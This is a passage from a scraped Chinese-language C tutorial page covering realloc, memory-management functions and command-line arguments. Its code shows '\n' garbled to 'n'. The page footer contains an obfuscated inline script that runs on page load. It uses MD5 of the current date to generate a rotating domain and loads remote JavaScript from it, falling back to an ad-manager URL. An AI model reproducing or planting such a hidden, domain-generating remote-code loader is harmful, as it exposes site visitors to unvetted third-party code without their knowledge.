      strcpy( description, "Zara ali a DPS student.");
   }
   /* 假设您想要存储更大的描述信息 */
   description = (char *) realloc( description, 100 * sizeof(char) );
   if( description == NULL )
   {
      fprintf(stderr, "Error - unable to allocate required memoryn");
   }
   else
   {
      strcat( description, "She is in class 10th");
   }
   
   printf("Name = %sn", name );
   printf("Description: %sn", description );
 
   /* 使用 free() 函数释放内存 */
   free(description);
}</code></pre> 
<p><span style="color:#7b7f82">（您可以尝试一下不重新分配额外的内存，strcat() 函数会生成一个错误，因为存储 description 时可用的内存不足。）</span></p> 
<blockquote> 
 <h4 id="C%20%E8%AF%AD%E8%A8%80%E4%B8%AD%E5%B8%B8%E7%94%A8%E7%9A%84%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E5%87%BD%E6%95%B0%E5%92%8C%E8%BF%90%E7%AE%97%E7%AC%A6">C 语言中常用的内存管理函数和运算符</h4> 
 <ul>
<li> <p>malloc() 函数：用于动态分配内存。它接受一个参数，即需要分配的内存大小（以字节为单位），并返回一个指向分配内存的指针</p> </li>
<li> <p></p> </li>
<li> <p>free() 函数：用于释放先前分配的内存。它接受一个指向要释放内存的指针作为参数，并将该内存标记为未使用状态</p> </li>
<li> <p></p> </li>
<li> <p>calloc() 函数：用于动态分配内存，并将其初始化为零。它接受两个参数，即需要分配的内存块数和每个内存块的大小（以字节为单位），并返回一个指向分配内存的指针</p> </li>
<li> <p></p> </li>
<li> <p>realloc() 函数：用于重新分配内存。它接受两个参数，即一个先前分配的指针和一个新的内存大小，然后尝试重新调整先前分配的内存块的大小。如果调整成功，它将返回一个指向重新分配内存的指针，否则返回一个空指针</p> </li>
<li> <p></p> </li>
<li> <p>sizeof 运算符：用于获取数据类型或变量的大小（以字节为单位）</p> </li>
<li> <p></p> </li>
<li> <p>指针运算符：用于获取指针所指向的内存地址或变量的值</p> </li>
<li> <p></p> </li>
<li> <p>&amp; 运算符：用于获取变量的内存地址</p> </li>
<li> <p></p> </li>
<li> <p>* 运算符：用于获取指针所指向的变量的值</p> </li>
<li> <p></p> </li>
<li> <p>-&gt; 运算符：用于指针访问结构体成员，语法为 pointer-&gt;member，等价于 (*pointer).member</p> </li>
<li> <p></p> </li>
<li> <p>memcpy() 函数：用于从源内存区域复制数据到目标内存区域。它接受三个参数，即目标内存区域的指针、源内存区域的指针和要复制的数据大小（以字节为单位）</p> </li>
<li> <p></p> </li>
<li> <p>memmove() 函数：类似于 memcpy() 函数，但它可以处理重叠的内存区域。它接受三个参数，即目标内存区域的指针、源内存区域的指针和要复制的数据大小（以字节为单位）</p> </li>
</ul> 
</blockquote> 
<h3 id="%E5%91%BD%E4%BB%A4%E8%A1%8C%E5%8F%82%E6%95%B0">命令行参数</h3> 
<p>执行程序时，可以从命令行传值给 C 程序。这些值被称为<strong>命令行参数</strong>，它们对程序很重要，特别是当您想从外部控制程序，而不是在代码内对这些值进行硬编码时，就显得尤为重要了。</p> 
<p>命令行参数是使用 main() 函数参数来处理的，其中，<strong>argc</strong> 是指传入参数的个数，<strong>argv[]</strong> 是一个指针数组，指向传递给程序的每个参数。下面是一个简单的实例，检查命令行是否有提供参数，并根据参数执行相应的动作：</p> 
<pre><code class="language-cpp">#include &lt;stdio.h&gt;

int main( int argc, char *argv[] )  
{
   if( argc == 2 )
   {
      printf("The argument supplied is %sn", argv[1]);
   }
   else if( argc &gt; 2 )
   {
      printf("Too many arguments supplied.n");
   }
   else
   {
      printf("One argument expected.n");
   }
}
</code></pre> 
<p></p>
                </div>

		</div>
	</article>
</main>




			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程小白.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<script src="https://www.w3counter.com/tracker.js?id=150625"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>